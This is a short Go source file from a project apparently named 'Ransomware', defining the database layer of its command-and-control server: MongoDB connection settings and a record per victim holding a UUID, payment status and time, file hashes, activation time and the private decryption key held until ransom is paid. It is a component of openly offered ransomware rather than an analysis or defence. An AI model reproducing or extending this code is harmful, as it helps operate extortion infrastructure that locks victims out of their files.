package database

import (
	"time"

	"github.com/Aran404/Ransomware/c2/types"
	"go.mongodb.org/mongo-driver/mongo"
)

var (
	ConnectionURI        = types.Config.Database.ConnectionURI
	DatabaseName         = types.Config.Database.DatabaseName
	CollectionRansomware = types.Config.Database.CollectionRansomware
	ConnectionTimeout    = time.Duration(types.Config.Database.ConnectionTimeoutSeconds) * time.Second
)

type (
	Connection struct {
		Client      *mongo.Client
		Collections map[string]*mongo.Collection
	}

	Ransomware struct {
		Paid       bool     `bson:"paid"`
		PaidAt     int64    `bson:"paid_at"` // unix timestamp ms
		Hashes     []string `bson:"hashes"`
		UUID       string   `bson:"uuid"`
		Activated  int64    `bson:"activated"` // unix timestamp ms
		PrivateKey string   `bson:"private_key"`
	}

	Production interface {
		Ransomware
	}
)
